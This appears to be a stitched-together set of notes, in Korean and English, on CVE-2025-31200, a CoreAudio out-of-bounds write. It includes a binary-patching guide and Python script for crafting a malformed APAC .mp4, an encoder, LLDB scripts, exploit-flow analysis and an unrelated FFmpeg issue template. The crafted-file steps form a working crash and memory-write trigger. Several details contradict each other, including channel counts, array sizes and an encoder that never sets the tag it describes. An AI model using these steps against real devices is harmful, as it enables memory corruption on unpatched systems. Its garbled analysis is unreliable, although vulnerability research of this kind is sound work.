
# APAC MP4 바이너리 패치 가이드: mChannelLayoutTag 조작으로 OOB 유도

---

## 🎯 목적

생성된 `.mp4` 파일은 5채널 오디오를 포함하고 있지만, `mChannelLayoutTag`는 2채널로 설정된 것처럼 보이도록 **바이너리 수정**하여 **RemappingArray 크기와 실제 데이터 간 불일치**를 유도합니다.

---

## 🧬 mChannelLayoutTag란?

- Apple의 채널 레이아웃 식별 값 (`UInt32`)
- 하위 2바이트(`0x0002`)가 **RemappingArray의 크기**로 사용됨
- 예: `0x00000002` → 2채널로 판단하고 RemappingArray 크기를 2로 설정

---

## 🧨 취약 조건 구성 요약

| 항목                    | 원래값 | 패치값 |
|-------------------------|--------|--------|
| 실제 채널 수            | 5      | 5      |
| `mChannelLayoutTag`     | 0x00000005 | **0x00000002** |

→ 이 경우, 디코더는 2채널만 RemappingArray로 할당하고,  
5개의 프레임 데이터를 리맵하려 할 때 OOB 발생

---

## 🛠️ 패치 절차

### 1. `hexdump` 등으로 `.mp4`를 바이너리로 확인

```bash
hexdump -C output_apac.mp4 | less
```

찾을 키워드 예시:
- `"chan"` (channel layout atom)
- `0x00000005` (5채널 태그) → 이걸 `0x00000002`로 수정

### 2. `xxd` + `sed`로 직접 바이트 수정

```bash
xxd output_apac.mp4 > hex.txt
# 편집: hex.txt에서 "00000005" → "00000002"
vim hex.txt
xxd -r hex.txt output_apac_patch.mp4
```

또는 `Python`으로도 가능:

```python
with open("output_apac.mp4", "rb") as f:
    data = bytearray(f.read())

old_tag = b"\x00\x00\x00\x05"
new_tag = b"\x00\x00\x00\x02"

index = data.find(old_tag)
if index != -1:
    data[index:index+4] = new_tag

with open("output_apac_patch.mp4", "wb") as f:
    f.write(data)
```

---

## ✅ 검증

```bash
ffmpeg -i output_apac_patch.mp4
```

또는 LLDB에서:

```lldb
breakpoint set --name DecodeAPACFrame
run output_apac_patch.mp4
check-mismatch
```

---

## ⚠️ 주의

- `chan` atom은 `.mp4`에서 내부적으로 압축되거나 숨겨질 수 있으므로 반드시 raw 패턴 매칭으로 수정
- 반드시 `.m4a`나 `.mp4`로 인코딩한 후 patch 시도

---




# 실험용 WAV 및 APAC MP4 파일 생성 가이드

이 가이드는 APAC 취약점 재현을 위한 다채널 WAV 파일을 생성하고, 이를 APAC 포맷 MP4로 변환하는 방법을 설명합니다.

---

## 📦 1. Python 스크립트로 .wav 파일 생성

### ✅ 필요한 라이브러리 설치
```bash
pip install soundfile numpy
```

### ▶️ 실행
```bash
python generate_apac_test_audio.py
```

### 📄 출력
- `sound440hz_5ch.wav`: 5채널짜리 440Hz sine tone 오디오 파일

---

## 🎵 2. APAC MP4로 변환 (macOS)

macOS의 `afconvert` 명령어를 사용해야 APAC 포맷으로 인코딩 가능합니다.

```bash
afconvert -o output_apac.mp4 -d apac -f mp4f sound440hz_5ch.wav
```

> ⚠️ `afconvert`는 macOS 전용이며, APAC 코덱 인코딩을 지원하는 유일한 사용자 도구입니다.

---

## 🔍 확인 방법

```bash
ffmpeg -i output_apac.mp4
```

출력 로그에서 다음과 같은 스트림이 보이면 성공입니다:

```
Stream #0:0: Audio: none (apac / 0x63617061), 48000 Hz, 4.0, ...
```

---

## 🧪 테스트 목적

이 파일은 `mRemappingArray`와 실제 오디오 채널 수의 불일치를 유도하여, APACChannelRemapper 내부의 OOB Write 취약점을 실험적으로 유도할 수 있습니다.




# generate_apac_test_audio.py
# This script creates a 5-channel dummy WAV file for use in APAC-related PoC testing.

import numpy as np
import soundfile as sf

# Configuration
channels = 5
samplerate = 48000
duration = 2.0  # 2 seconds
filename = "sound440hz_5ch.wav"

# Generate sine wave (440Hz tone)
t = np.linspace(0, duration, int(samplerate * duration), endpoint=False)
tone = 0.5 * np.sin(2 * np.pi * 440 * t)

# Duplicate tone across channels
data = np.column_stack([tone for _ in range(channels)])

# Save WAV file
sf.write(filename, data, samplerate, subtype='PCM_16')
print(f"[+] Created multi-channel WAV file: {filename}")






# CVE-2025-31200 Deep Technical Analysis

---

## 📌 Part 1: mRemappingArray와 Permutation Map 불일치 구조 분석

### 구조도 설명

```
mChannelLayoutTag = 0x02 → 하위 2바이트로 mRemappingArray 크기 결정
mRemappingArray (크기 3개): [0, 1, 2]
APACFrame (실제 데이터 5개): [0, 1, 2, 3, 4]
```

→ 문제: `remappingArray.size = 3`, `channel count = 5`

```asm
// 예시 (ARM64)
LDR     x9, [x8, #0x8]     ; x9 = mRemappingArray[i]
LDR     x10, [frame, x9, LSL #3]  ; x10 = frame[x9]
STR     x10, [output, i, LSL #3] ; output[i] = frame[x9]
```

→ `x9`가 0~2일 것으로 예상하지만, 실제는 더 큰 인덱스를 접근해 **frame 밖을 읽거나 씀**.

---

## 🧨 Part 2: OOB Write 동작 흐름

### 발생 경로

```
1. mRemappingArray[i] = 4
2. frame size = 4 (index 0~3)
3. LDR x10, [frame, x9, LSL #3] → OOB Read
4. STR x10, [output, i, LSL #3] → OOB Write
```

이 때 x9=4이면:

```
[frame + (4 << 3)] → frame+32 = 외부 메모리 접근
```

---

## 🚀 Part 3: Exploit 흐름도

```text
+----------------------------+
| Crafted .mp4 (APAC audio) |
+----------------------------+
             |
             v
+-------------------------------+
| mRemappingArray mismatch     |
| mChannelLayoutTag = 0x02     |
| but frame has 5+ components  |
+-------------------------------+
             |
             v
+----------------------------+
| APACChannelRemapper::Process |
+----------------------------+
             |
             v
+-------------------+      YES       +--------------------------+
| Bounds Check?     |  ------------> | OOB Write (frame buffer) |
+-------------------+                +--------------------------+
        |
       NO
        v
+----------------------------+
| Crash or silent corruption |
+----------------------------+
```

---

## 🛠️ Part 4: 취약한 .mp4 생성 PoC (afconvert)

```bash
# sound440.wav: 5채널 dummy 오디오 (manually crafted)
afconvert -o output.mp4 -d apac -f mp4f sound440.wav
```

or Objective-C++로:

```objc
apacFormat.mChannelsPerFrame = 5;
apacFormat.mChannelLayoutTag = 0x02; // Indicates 2 channels
```

→ 이 불일치가 exploit 유도

---

## 🔀 Part 5: 패치 전후 코드 diff 분석

### 🔴 Before (macOS < 15.4.1)

```cpp
mRemappingArray.resize(channelLayout->mChannelLayoutTag & 0xFFFF);
```

### ✅ After (macOS 15.4.1+)

```cpp
UInt32 expectedCount = channelLayout->mNumberChannelDescriptions;
if (expectedCount != (mChannelLayoutTag & 0xFFFF)) {
    return kAudioFormatUnsupportedDataFormatError;
}
```

→ 검증 추가: **Remapping count == channel description count** 확인

---

## ✅ 결론

- mChannelLayoutTag 기반으로 remap 배열을 만들면서, 실 채널 수 검증 생략
- 이로 인해 디코더가 **Out-of-Bounds Write** 유발
- Patch는 이 두 값의 일치를 **사전 검사**함으로써 해결





# CVE-2025-31200 분석 및 번역 요약

이 게시물은 Apple의 CoreAudio 시스템에서 발견된 보안 취약점인 **CVE-2025-31200**에 대한 **PoC(Proof-of-Concept)** 설명이며, **iOS 18.4.1**에서 해당 문제가 패치되었음을 전제로 **macOS < 15.4.1** 환경에서 재현 가능한 취약점을 다루고 있습니다. 아래에 전체 내용을 **번역 + 분석 + 기술 스택 설명 + 재현 단계**로 정리합니다.

---

## 🔍 핵심 개요

- **취약점명:** CVE-2025-31200  
- **위치:** `AudioCodecs` → `APACChannelRemapper::Process` 함수  
- **PoC 동작환경:** macOS 15.4.1 이전 버전에서 재현 가능  
- **취약 동작:** `mRemappingArray`와 `permutation map` 사이의 불일치로 인해 디코딩 중 **Out-of-Bounds Read/Write 발생**  
- **결과:** 크래시 또는 제한적이지만 통제 가능한 메모리 쓰기 (Controlled Write)  
- **형식:** `output.mp4` 오디오 파일을 재생하면, 특정 조건에서 **EXC_BAD_ACCESS** 발생  

---

## 🧠 번역 및 단계별 설명

### 🔸 상단 요약

> 이 PoC는 CVE-2025-31200의 취약점을 시연하며, `APACChannelRemapper::Process`에서 OOB Write가 발생함.

- mChannelLayoutTag의 하위 2바이트로 `mRemappingArray` 크기를 결정  
- 이후 실제 디코딩 시점에는 `mTotalComponents`로 실제 프레임 데이터를 처리  
- 이 불일치로 **frame 데이터를 remapping할 때 buffer overflow** 발생  

### 🔸 재현 환경

- **macOS < 15.4.1**
- `output.mp4` 파일을 AVAudioPlayer 등으로 재생
- `lldb`에서 `check-mismatch` 후크를 걸어 내부 mismatch를 추적

### 🔸 발견 내용

- GuardMalloc을 활성화하면 **`APACChannelRemapper::Process` 함수에서 읽기 OOB**
- GuardMalloc 없이 실행하면 **`_platform_memmove` 함수에서 쓰기 OOB 발생**

```bash
lldb run output.mp4
# crash at: APACChannelRemapper::Process
# or later at: _platform_memmove
```

---

## 💻 사용 기술 스택

| 구성 요소           | 설명                                      |
|--------------------|-------------------------------------------|
| **AudioToolbox**   | Apple의 CoreAudio 라이브러리 (프레임워크) |
| **APAC**           | Apple Positional Audio Codec               |
| **HOA**            | Higher-order Ambisonics                   |
| **LLDB**           | 디버깅 도구, 후킹 및 메모리 확인용         |
| **afconvert**      | 오디오 변환 도구 (`wav → apac`)            |
| **Bindiff**        | iOS 18.4 vs 18.4.1의 바이너리 비교         |
| **Guard Malloc**   | 메모리 오류 탐지 툴 (Xcode에서 사용 가능) |
| **Xcode + macOS**  | 디버깅 및 디코딩 환경                      |
| **output.mp4**     | PoC 오디오 파일                            |

---

## 🧪 기술 재현 방법

### 1. 취약 macOS 버전 설치
- `macOS < 15.4.1` 환경 필요 (취약 함수 미패치)

### 2. PoC 오디오 파일 준비

```bash
afconvert -o output.mp4 -d apac -f mp4f sound440hz.wav
```

### 3. LLDB 후크 스크립트 준비

```lldb
# check-mismatch 후크 스크립트 사용
command script import check-mismatch.py
```

### 4. 디버깅 실행

```bash
lldb ./audio_player_binary
(lldb) run output.mp4
(lldb) bt  # Backtrace to see crash in APACChannelRemapper::Process or memmove
```

### 5. Guard Malloc으로 보호 메모리 추적
- Xcode → Scheme → Diagnostics → Enable Guard Malloc 체크

---

## 📸 첨부 이미지 분석

### 📷 이미지 1
- 크래시 위치: `APACChannelRemapper::Process`
- 문제 주소: `0x37c1ce000`에 접근 중 **EXC_BAD_ACCESS**
- Backtrace를 보면 `mRemappingArray` 접근에서 쓰기/읽기 오류 발생
- Thread 13 (AQConverterThread)에서 실행 중

### 📷 이미지 2
- 크래시 위치: `_platform_memmove`
- 문제 주소: `0x4d` → 명백한 NULL 또는 잘못된 오프셋 메모리 복사 시도
- remapping 결과를 복사 중 invalid access

---






# CVE-2025-31200 - Apple CoreAudio APACChannelRemapper Exploit (PoC)

This repository demonstrates a proof-of-concept for CVE-2025-31200, a vulnerability in Apple's CoreAudio `APACChannelRemapper::Process` function, discovered in iOS 18.4 and patched in iOS 18.4.1 / macOS 15.4.1.

---

## 🔍 Overview

- **Vulnerability**: CVE-2025-31200
- **Affected Component**: `AudioCodecs` → `APACChannelRemapper::Process`
- **Issue**: Out-of-Bounds Read/Write via mRemappingArray mismatch
- **PoC Requirement**: macOS < 15.4.1
- **Trigger**: Playing a specially crafted `.mp4` (APAC audio) file
- **Impact**: Controlled write primitive with potential for RCE

---

## 💻 Technologies Used

| Component            | Description |
|---------------------|-------------|
| AudioToolbox        | CoreAudio framework |
| APAC                | Apple Positional Audio Codec |
| HOA                 | Higher-order Ambisonics |
| LLDB                | Debugger (used to inspect mismatch) |
| afconvert           | Used to convert WAV to APAC format |
| GuardMalloc         | Detect memory corruption during playback |
| Xcode               | Debugging on macOS |
| output.mp4          | Crafted test audio file |

---

## 📜 1. LLDB Hook Script: `check-mismatch.py`

```python
import lldb

def __lldb_init_module(debugger, internal_dict):
    debugger.HandleCommand('command script add -f check_mismatch.check_mismatch check-mismatch')

def check_mismatch(debugger, command, result, internal_dict):
    target = debugger.GetSelectedTarget()
    process = target.GetProcess()
    thread = process.GetSelectedThread()
    frame = thread.GetSelectedFrame()

    try:
        mRemappingArray_expr = "((APACChannelRemapper *)$x0)->mRemappingArray"
        layout_expr = "((APACChannelRemapper *)$x0)->mChannelLayout"

        remap_val = frame.EvaluateExpression(mRemappingArray_expr)
        layout_val = frame.EvaluateExpression(layout_expr)

        if remap_val.IsValid() and layout_val.IsValid():
            count_remap = remap_val.GetNumChildren()
            count_layout = layout_val.GetChildMemberWithName("mNumberChannelDescriptions").GetValueAsUnsigned()

            print(f"[check-mismatch] remappingArray size: {count_remap}")
            print(f"[check-mismatch] mChannelDescriptions count: {count_layout}")

            if count_remap != count_layout:
                print("[check-mismatch] ❗️Mismatch detected!")
            else:
                print("[check-mismatch] ✅ Arrays are consistent")
        else:
            print("[check-mismatch] Error: Unable to resolve remappingArray or layout")
    except Exception as e:
        print(f"[check-mismatch] Exception: {e}")
```

Usage:
```lldb
command script import check-mismatch.py
check-mismatch
```

---

## 🎵 2. PoC Encoder: `encodeme.mm`

```objc
#import <AudioToolbox/AudioToolbox.h>

void encodeToAPAC() {
    NSString *inputPath = @"/path/to/input.wav";
    NSString *outputPath = @"/path/to/output_apac.m4a";

    NSURL *inputURL = [NSURL fileURLWithPath:inputPath];
    NSURL *outputURL = [NSURL fileURLWithPath:outputPath];

    ExtAudioFileRef inFile = NULL;
    ExtAudioFileRef outFile = NULL;
    OSStatus status;

    AudioStreamBasicDescription inFormat;
    UInt32 propSize = sizeof(inFormat);

    status = ExtAudioFileOpenURL((__bridge CFURLRef)inputURL, &inFile);
    ExtAudioFileGetProperty(inFile, kExtAudioFileProperty_FileDataFormat, &propSize, &inFormat);

    AudioStreamBasicDescription apacFormat = {0};
    apacFormat.mSampleRate = 48000;
    apacFormat.mFormatID = kAudioFormatAPAC;
    apacFormat.mChannelsPerFrame = 4;
    apacFormat.mFramesPerPacket = 1024;

    ExtAudioFileCreateWithURL((__bridge CFURLRef)outputURL,
                               kAudioFileM4AType,
                               &apacFormat,
                               NULL,
                               kAudioFileFlags_EraseFile,
                               &outFile);

    ExtAudioFileSetProperty(outFile, kExtAudioFileProperty_ClientDataFormat, sizeof(inFormat), &inFormat);

    UInt32 bufferSize = 4096;
    UInt8 buffer[bufferSize];
    AudioBufferList bufferList = {0};
    bufferList.mNumberBuffers = 1;
    bufferList.mBuffers[0].mData = buffer;
    bufferList.mBuffers[0].mDataByteSize = bufferSize;
    bufferList.mBuffers[0].mNumberChannels = inFormat.mChannelsPerFrame;

    while (true) {
        UInt32 frameCount = bufferSize / inFormat.mBytesPerFrame;
        status = ExtAudioFileRead(inFile, &frameCount, &bufferList);
        if (frameCount == 0 || status != noErr) break;
        ExtAudioFileWrite(outFile, frameCount, &bufferList);
    }

    ExtAudioFileDispose(inFile);
    ExtAudioFileDispose(outFile);
}
```

---

## 🧪 3. Reproduction Steps

1. Setup a macOS < 15.4.1 system
2. Convert audio using `encodeme.mm` or:
```bash
afconvert -o output.mp4 -d apac -f mp4f sound440hz.wav
```
3. Enable **GuardMalloc** in Xcode
4. Debug with LLDB:
```bash
lldb ./your_audio_player
run output.mp4
check-mismatch
```

---

## 📎 Notes

- The `kAudioFormatAPAC` may require a manual define: `#define kAudioFormatAPAC 'apac'`
- Internals may vary slightly depending on your system version.

---

MIT License






# FFmpeg Enhancement 요청 #11480 확장: APAC 코덱 PoC 및 제출 템플릿

---

## 🔧 1. PoC 코드 예시: APAC 트랙 존재 확인 및 추출 실패 확인

다음 FFmpeg 스크립트는 `.mov` 파일 내 APAC 트랙을 확인하고, 디코딩 시도를 통해 실패 여부를 확인합니다.

```bash
#!/bin/bash

INPUT_FILE="IMG_0755.mov"
OUTPUT_FILE="output.m4a"

echo "[*] 파일 내 스트림 정보 출력"
ffmpeg -i "$INPUT_FILE"

echo "[*] APAC 오디오 스트림 추출 시도"
ffmpeg -i "$INPUT_FILE" -map 0:1 -c:a copy "$OUTPUT_FILE"
```

실행 시 예상 출력:
```
Could not find codec parameters for stream 1 (Audio: none (apac / 0x63617061), ...)
Error opening output file ...
```

> 💡 `0:1`은 APAC 오디오 스트림을 의미하며, 스트림 번호는 파일에 따라 다를 수 있습니다.

---

## 🎵 2. 테스트 샘플 구조

아래는 샘플 테스트 폴더 구조입니다:

```
ffmpeg-apac-test/
├── IMG_0755.mov       # iPhone에서 추출한 테스트 파일
├── test_poc.sh        # 위 PoC 스크립트
├── README.md          # 재현 방법 정리
```

> 샘플 `.mov` 파일은 [FFastrans 포럼](https://ffastrans.com/frm/forum/download/file.php?id=1785)에서 다운로드 가능합니다.

---

## 📝 3. FFmpeg GitHub Issue 제출 템플릿

```markdown
### Summary

FFmpeg currently fails to decode or map `.mov` files containing Apple’s new spatial audio codec APAC (`apac` / `0x63617061`), introduced with iPhone 16.

### Reproduction

1. Download [sample file](https://ffastrans.com/frm/forum/download/file.php?id=1785)
2. Run:
    ```bash
    ffmpeg -i IMG_0755.mov -map 0:1 -c:a copy output.m4a
    ```

### Output

```
[mov,mp4,...] Could not find codec parameters for stream 1 (Audio: none (apac / 0x63617061), ...)
[aist#0:1/none] Decoding requested, but no decoder found for: none
```

### Expected Behavior

FFmpeg should:
- Either ignore unsupported `apac` streams silently (like `-map 0:a?`)
- Or implement fallback behavior or proper error

### Environment

- FFmpeg Version: git-master (latest)
- Platform: Windows / macOS
- Affected file: `.mov` with `apac` track

### Proposed Solution

Implement support for the `apac` codec, or allow clean skipping of unknown audio formats.

Tag: `codec`, `apple`, `apac`, `spatial-audio`, `mov`

```

---

## 📌 결론

이 문서와 샘플은 FFmpeg 개발자에게 문제 재현과 기능 구현 필요성을 명확히 전달하기 위한 자료입니다.  
GitHub에 이슈 제출 시 이 구조를 그대로 복사하여 사용 가능합니다.



# FFmpeg APAC Codec Test

This directory demonstrates a reproducible issue with FFmpeg's lack of support for Apple's APAC (Positional Audio Codec) format, present in `.mov` files recorded on newer iPhones (e.g., iPhone 16 and later).

## Files

- `IMG_0755.mov`: Sample MOV file containing APAC audio (download separately)
- `test_poc.sh`: Bash script that attempts to extract the APAC audio stream
- `output_apac.m4a`: Expected (but likely failed) output file from FFmpeg

## How to Run

Make sure you have FFmpeg installed and executable from the command line.

```bash
chmod +x test_poc.sh
./test_poc.sh
```

## Expected Output

You will see an error such as:

```
Could not find codec parameters for stream 1 (Audio: none (apac / 0x63617061), ...)
Decoding requested, but no decoder found for: none
```

## Notes

- This is a known FFmpeg issue tracked in [ticket #11480](https://trac.ffmpeg.org/ticket/11480)
- You can submit feedback or a patch to the FFmpeg GitHub project to help resolve this

test_poc.sh

#!/bin/bash

# File: test_poc.sh
# Description: Attempt to extract APAC audio stream using FFmpeg

INPUT_FILE="IMG_0755.mov"
OUTPUT_FILE="output_apac.m4a"

echo "[*] Checking stream information..."
ffmpeg -i "$INPUT_FILE"

echo "[*] Attempting to extract APAC audio stream (Stream #1 assumed)..."
ffmpeg -i "$INPUT_FILE" -map 0:1 -c:a copy "$OUTPUT_FILE"




------------------------------------------------------------
저자설명

Proof-of-concept for the CoreAudio patch (CVE-2025-31200) in [iOS 18.4.1](https://support.apple.com/en-us/122282).

# Update 05/27/2025
I have been able to push this to a *controlled* if not arbitrary write. The writeup is coming soon. In order to see for yourself though, you'll have to build on a version of macos before the patch: < 15.4.1. You can play the audio with the check-mismatch lldb hook (using a simple harness that just plays the audio) in order to see the write. It is not a great arbitrary write yet, as I mentioned above for a few reasons - but mainly because I am still not 100% sure at what stage of the decoding pipeline these values from the frame buffer are at when they are remapped. I am stopping here though to work on the writeup if somebody wants to take it up.

# Update 05/21/2025
I @noahhw46 (couldn't have done it without this setup @zhouwei) figured it out (writeup coming soon). However, there is still a lot more to understand. I added the first bit of the next steps of my investigation here in order to show exactly what the bug *does*. check-mismatch is another lldb script that can be used with a working poc to show exactly the mismatch that was created between the mRemappingArray and the permutation map in `APACChannelRemapper::Process` (really in `APACHOADecoder::DecodeAPACFrame`).

----

```
The mRemappingArray is sized based on the lower two bytes of mChannelLayoutTag.
By creating a mismatch between them, a later stage of processing in APACHOADecoder::DecodeAPACFrame is corrupted.
When the APACHOADecoder goes to process the APAC frame (permute it according to the channel remapping array), it uses the mRemappingArray as the permutation map to do the well, channel remapping. It seems like the frame data that is being remapped is sized based on mTotalComponenets.
```

When you play the `output.mp4` audio file (e.g. with AVAudioPlayer), `APACChannelRemapper::Process` will read then write out of bounds.

You can see the first read out of bounds if you enable Guard Malloc in Xcode:

<img width="1024" alt="Xcode displaying crash in APACChannelRemapper::Process" src="https://github.com/user-attachments/assets/c733936b-2b91-43a2-9047-5651b66ce81d" />

Without Guard Malloc, `APACHOADecoder::DecodeAPACFrame` will later crash with an invalid `memmove`:

<img width="1024" alt="Xcode displaying crash in _platform_memmove" src="https://github.com/user-attachments/assets/9fddfbea-e9a8-4672-acf9-c5b193fefe95" />

----

@zhuowei's Previous README is below:


Trying to understand the CoreAudio patch (CVE-2025-31200) in [iOS 18.4.1](https://support.apple.com/en-us/122282).

I haven't figure it out yet.

Currently, I get different error messages when decoding `output.mp4` on macOS 15.4.1:

```
error	01:10:26.743480-0400	getaudiolength	<private>:548    Invalid mRemappingArray bitstream in hoa::CodecConfig::Deserialize()
error	01:10:26.743499-0400	getaudiolength	<private>:860    Error in deserializing ASC components
```

vs Xcode Simulator for visionOS 2.2:

```
error	01:09:21.841805-0400	VisionOSEvaluation	          APACProfile.cpp:424    ERROR: Wrong profile index in GlobalConfig
error	01:09:21.841914-0400	VisionOSEvaluation	     APACGlobalConfig.cpp:894    Profile and level data could not be validated
```

so I am hitting the new check, but I don't know how to get it to actually overwrite something.

## info on the changed function

The changed function [seems](https://github.com/blacktop/ipsw-diffs/blob/main/18_4_22E240__vs_18_4_1_22E252/README.md) to be `apac::hoa::CodecConfig::Deserialize` in `/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs`.

APAC is [Apple Positional Audio Codec](https://support.apple.com/en-by/guide/immersive-video-utility/dev4579429f0/web#:~:text=Apple%20Positional%20Audio%20Codec)

HOA is [Higher-order Ambisonics](https://en.wikipedia.org/wiki/Ambisonics#Higher-order_Ambisonics).

If you look at a [sample file from ffmpeg issue tracker](https://trac.ffmpeg.org/ticket/11480):

```
$ avmediainfo ~/Downloads/clap.MOV 
Asset: /Users/zhuowei/Downloads/clap.MOV
<...>
Track 3: Sound 'soun'
	Enabled: No
	Format Description 1:
		Format: APAC 'apac'
		Channel Layout: High-Order Ambisonics, ACN/SN3D
		Sample rate: 48000.0
		Bytes per packet: 0
		Frames per packet: 1024
		Bytes per frame: 0
		Channels per frame: 4
		Bits per channel: 0
	System support for decoding this track: Yes
	Data size: 43577 bytes
	Media time scale: 48000
	Duration: 0.898 seconds
	Estimated data rate: 363.142 kbit/s
	Extended language tag: und
	1 segment present
	Index   Media Start  Media Duration   Track Start  Track Duration 
	    1  00:00:00.000    00:00:00.898  00:00:00.000    00:00:00.898
	Member of alternate group 0: (2, 3)
```

You can convert to APAC with `afconvert -o sound440.m4a -d apac -f mp4f sound440hz.wav`.

Using `bindiff` on iOS 18.4.1 vs 18.4, it seems reading the `mRemappingArray` now checks the global `AudioChannelLayout*` at offset 0x58 for the number of channels instead of the remapping `AudioChannelLayout*` at offset 0x78.

The `encodeme.mm` file encodes APAC, and an LLDB script forces extra elements into `mRemappingArray` and the remapping `AudioChannelLayout`:

```
./build_encodeme.sh
./run_encodeme.sh
```

